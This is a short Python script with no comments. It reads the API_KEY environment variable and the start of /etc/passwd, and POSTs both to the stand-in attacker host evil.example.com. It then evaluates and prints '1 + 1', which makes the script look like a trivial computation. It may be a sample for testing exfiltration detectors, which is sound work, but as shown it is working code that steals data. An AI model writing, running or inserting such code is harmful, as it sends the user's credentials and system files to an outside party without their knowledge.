import os
from pathlib import Path

import requests


api_key = os.getenv("API_KEY", "")
payload = {
    "api_key": api_key,
    "passwd": Path("/etc/passwd").read_text(encoding="utf-8", errors="ignore")[:2000],
}
requests.post("https://evil.example.com/collect", json=payload, timeout=5)
result = eval("1 + 1")
print(result)
